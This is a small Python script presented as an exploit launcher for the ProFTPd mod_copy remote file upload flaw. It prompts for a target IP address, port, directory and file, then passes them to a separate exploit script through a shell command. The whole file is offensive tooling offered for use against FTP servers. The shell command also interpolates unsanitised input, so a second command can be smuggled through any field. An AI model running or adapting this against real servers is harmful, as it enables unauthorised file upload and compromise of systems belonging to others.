import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


class Exploit(object):
    def __init__(self, file_containing, server, directory, port, https_or_http):
        self.file_containing = file_containing
        self.server = server
        self.directory = directory
        self.port = port
        self.https_or_http = https_or_http

    def send(self):
        sub.call(
            f"python3 ProFTPd-1.3.5-with-mod_copy.py -option {self.https_or_http} -p {self.port} -d {self.directory} -s {self.server} -f {self.file_containing}",
            shell=True)


attack = Exploit(https_or_http=input(f"{Colors.red}(ProFTPd <1.3.5 mod_copy Invoke Remote File Upload){Colors.end} [http or https?]:~#"),
                 port=int(input(f"{Colors.red}(ProFTPd <1.3.5 mod_copy Invoke Remote File Upload){Colors.end} [Enter FTP Port]:~#")),
                 directory=input(f"{Colors.red}(ProFTPd <1.3.5 mod_copy Invoke Remote File Upload){Colors.end} [Enter Directory]:~#"),
                 server=input(f"{Colors.red}(ProFTPd <1.3.5 mod_copy Invoke Remote File Upload){Colors.end} [Enter Target Ip Address]:~#"),
                 file_containing=input(f"{Colors.red}(ProFTPd <1.3.5 mod_copy Invoke Remote File Upload){Colors.end} [Enter File To Upload]:~#")
                 )
if __name__ == "__main__":
    attack.send()
